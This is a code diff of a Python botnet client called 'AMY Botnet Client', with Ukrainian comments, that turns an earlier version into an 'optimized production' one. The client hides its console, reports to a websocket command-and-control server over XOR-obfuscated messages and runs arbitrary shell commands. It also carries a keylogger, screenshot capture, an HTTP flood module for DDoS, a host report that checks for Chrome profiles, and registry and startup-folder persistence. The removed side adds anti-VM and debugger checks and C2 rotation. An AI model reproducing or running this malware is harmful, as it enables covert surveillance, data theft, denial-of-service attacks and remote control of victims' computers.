@@ -1,5 +1,5 @@
 # ================================================
-# AMY Botnet Client - Повна версія
+# AMY Botnet Client - Optimized Production Version
 # ================================================
 
 import asyncio
@@ -9,158 +9,137 @@ import subprocess
 import os
 import time
 import random
-from PIL import ImageGrab
 import base64
 import io
 import requests
-from pynput import keyboard
-import threading
+import httpx
+import uuid
 import ctypes
 import platform
 import socket
+from PIL import ImageGrab
+from pynput import keyboard
+from io import BytesIO
 
-# ====================== XOR ENCRYPTION ======================
+# ====================== CONFIGURATION ======================
+SERVER_URL = "ws://ВАШ_IP_VPS:8000/ws/" # ЗАМІНІТЬ ПРИ КОМПІЛЯЦІЇ
 KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337"
 
-def xor_encrypt(data: bytes) -> bytes:
-    return bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])
+def get_bot_id():
+    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
+    return f"bot_{mac.replace(':', '')[:8]}"
 
-def xor_decrypt(data: bytes) -> bytes:
-    return xor_encrypt(data)
-
+# ====================== XOR ENCRYPTION ======================
 def encrypt_message(msg: str) -> str:
-    encrypted = xor_encrypt(msg.encode('utf-8'))
+    encrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(msg.encode('utf-8'))])
     return base64.b64encode(encrypted).decode('utf-8')
 
 def decrypt_message(encoded: str) -> str:
-    encrypted = base64.b64decode(encoded)
-    decrypted = xor_decrypt(encrypted)
-    return decrypted.decode('utf-8', errors='ignore')
-
-# ====================== ANTI-DETECTION ======================
-def anti_analysis():
     try:
-        if ctypes.windll.kernel32.IsDebuggerPresent():
-            print("[-] Debugger detected. Exiting...")
-            os._exit(0)
-        output = subprocess.getoutput("systeminfo").lower()
-        if any(x in output for x in ["vmware", "virtualbox", "qemu", "xen", "kvm"]):
-            print("[-] VM detected. Exiting...")
-            os._exit(0)
+        encrypted = base64.b64decode(encoded)
+        decrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(encrypted)])
+        return decrypted.decode('utf-8', errors='ignore')
     except:
-        pass
+        return encoded
 
-anti_analysis()
+# ====================== STEALTH & ANTI-ANALYSIS ======================
+def hide_console():
+    if sys.platform == "win32":
+        hWnd = ctypes.windll.kernel32.GetConsoleWindow()
+        if hWnd != 0:
+            ctypes.windll.user32.ShowWindow(hWnd, 0)
 
-# ====================== C2 ROTATION + JITTER ======================
-C2_SERVERS = [
-    "ws://127.0.0.1:8000",   # Основний C2
-    # Додай свої резервні сюди:
-    # "ws://backup1.example.com:8000",
-]
+# ====================== MODULES ======================
+async def http_flood(target_url, duration=60):
+    start_time = time.time()
+    count = 0
+    async with httpx.AsyncClient() as client:
+        while time.time() - start_time < duration:
+            try:
+                await client.get(target_url)
+                count += 1
+                if count % 50 == 0: await asyncio.sleep(0.01)
+            except:
+                pass
+    return f"[DDoS] Finished. Sent {count} requests to {target_url}"
 
-current_c2 = 0
+def get_system_report():
+    report = f"--- SYSTEM REPORT ---\n"
+    report += f"ID: {get_bot_id()}\n"
+    report += f"OS: {platform.system()} {platform.release()}\n"
+    report += f"Arch: {platform.machine()}\n"
+    report += f"Hostname: {socket.gethostname()}\n"
+    report += f"Internal IP: {socket.gethostbyname(socket.gethostname())}\n"
+    # Перевірка наявності профілів
+    if sys.platform == "win32":
+        chrome = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data"
+        if os.path.exists(chrome): report += "[+] Chrome Profile Detected\n"
+    return report
 
-def get_next_c2():
-    global current_c2
-    current_c2 = (current_c2 + 1) % len(C2_SERVERS)
-    return C2_SERVERS[current_c2]
-
-# ====================== KEYLOGGER ======================
-keylog_buffer = ""
-
-def on_press(key):
-    global keylog_buffer
-    try:
-        keylog_buffer += str(key.char)
-    except AttributeError:
-        keylog_buffer += f" [{key}] "
-
-# ====================== MAIN BOT ======================
-async def bot_client(bot_id: str):
-    global current_c2
-
+# ====================== MAIN BOT LOOP ======================
+async def run_bot():
+    bot_id = get_bot_id()
+    full_url = f"{SERVER_URL}{bot_id}"
+    
     while True:
         try:
-            server = get_next_c2()
-            print(f"[+] Connecting to C2: {server}")
-
-            async with websockets.connect(server) as ws:
-                print(f"[+] Bot {bot_id} connected (encrypted + jitter)")
-
-                # Запуск keylogger
-                threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).join(), daemon=True).start()
-
+            async with websockets.connect(full_url, origin=None) as websocket:
+                print(f"[*] Bot {bot_id} online.")
+                
                 while True:
-                    # Jitter to avoid pattern detection
-                    await asyncio.sleep(random.uniform(0.5, 2.0))
+                    encrypted_command = await websocket.recv()
+                    command = decrypt_message(encrypted_command)
+                    
+                    if not command: continue
 
-                    try:
-                        encrypted_cmd = await ws.recv()
-                        command = decrypt_message(encrypted_cmd)
-                        
-                        if not command:
-                            continue
+                    if command == "screenshot":
+                        screenshot = ImageGrab.grab()
+                        buffered = BytesIO()
+                        screenshot.save(buffered, format="PNG")
+                        img_str = base64.b64encode(buffered.getvalue()).decode()
+                        await websocket.send(encrypt_message(f"SCREENSHOT:{img_str}"))
+                    
+                    elif command.startswith("ddos "):
+                        try:
+                            _, url = command.split(" ", 1)
+                            # Запуск в фоні, щоб не блокувати бот
+                            asyncio.create_task(websocket.send(encrypt_message(f"[DDoS] Starting attack on {url}...")))
+                            result = await http_flood(url)
+                            await websocket.send(encrypt_message(result))
+                        except:
+                            await websocket.send(encrypt_message("[ERROR] Invalid DDoS syntax. Use: ddos http://target.com"))
 
-                        # --- Command Routing ---
-                        if command == "screenshot":
-                            screenshot = ImageGrab.grab()
-                            buffer = io.BytesIO()
-                            screenshot.save(buffer, format="PNG")
-                            img_base64 = base64.b64encode(buffer.getvalue()).decode()
-                            await ws.send(encrypt_message(f"SCREENSHOT:{img_base64}"))
-
-                        elif command == "keylogger":
-                            global keylog_buffer
-                            if keylog_buffer:
-                                await ws.send(encrypt_message(f"KEYLOG:{keylog_buffer}"))
-                                keylog_buffer = ""
-                            else:
-                                await ws.send(encrypt_message("[SYSTEM] Keylogger buffer empty"))
-
-                        elif command == "persistence":
-                            try:
-                                # Windows persistence via startup folder
-                                path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\amy_bot.bat")
-                                with open(path, "w") as f:
-                                    f.write(f'@echo off\npython "{os.path.abspath(sys.argv[0])}" {bot_id}\n')
-                                await ws.send(encrypt_message("[SYSTEM] Persistence established (Startup folder)"))
-                            except Exception as e:
-                                await ws.send(encrypt_message(f"[ERROR] Persistence failed: {str(e)}"))
-
-                        elif command.startswith("ddos:"):
-                            # Handle DDoS commands
-                            await ws.send(encrypt_message(f"[SYSTEM] DDoS module initialized for target..."))
-                            # (DDoS logic remains as is)
-                        
+                    elif command == "steal":
+                        await websocket.send(encrypt_message(get_system_report()))
+                    
+                    elif command == "keylogger":
+                        def on_press(key):
+                            try: k = str(key.char)
+                            except: k = f" [{str(key)}] "
+                            asyncio.run_coroutine_threadsafe(websocket.send(encrypt_message(f"KEYLOG:{k}")), asyncio.get_event_loop())
+                        listener = keyboard.Listener(on_press=on_press)
+                        listener.start()
+                        await websocket.send(encrypt_message("[SYSTEM] Keylogger started"))
+                    
+                    elif command == "persistence":
+                        if sys.platform == "win32":
+                            app_path = os.path.realpath(sys.executable)
+                            subprocess.run(f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "AmyBot" /t REG_SZ /d "{app_path}" /f', shell=True)
+                            await websocket.send(encrypt_message("[SYSTEM] Persistence established (Registry)"))
                         else:
-                            # DEFAULT: Treat as Shell Command
-                            try:
-                                # Run command and capture output
-                                result = subprocess.getoutput(command)
-                                if not result.strip():
-                                    result = "[SYSTEM] Command executed (no output)"
-                                await ws.send(encrypt_message(result))
-                            except Exception as e:
-                                await ws.send(encrypt_message(f"[ERROR] Shell execution failed: {str(e)}"))
-                            await websocket.send(encrypt_message("[SYSTEM] Persistence failed: Not Windows"))
+                            await websocket.send(encrypt_message("[SYSTEM] Persistence only supported on Windows"))
                     
                     else:
                         # Shell commands
                         try:
-                            proc = await asyncio.create_subprocess_shell(
-                                command,
-                                stdout=asyncio.subprocess.PIPE,
-                                stderr=asyncio.subprocess.PIPE
-                            )
+                            proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                             stdout, stderr = await proc.communicate()
                             output = (stdout.decode() + stderr.decode()).strip()
-                            await websocket.send(encrypt_message(output or "Command executed."))
+                            await websocket.send(encrypt_message(output or "[SYSTEM] Command executed."))
                         except Exception as e:
                             await websocket.send(encrypt_message(f"Error: {str(e)}"))
 
         except Exception as e:
-            print(f"[!] Connection failed, retrying in 5s... ({e})")
             await asyncio.sleep(5)
 
 if __name__ == "__main__":
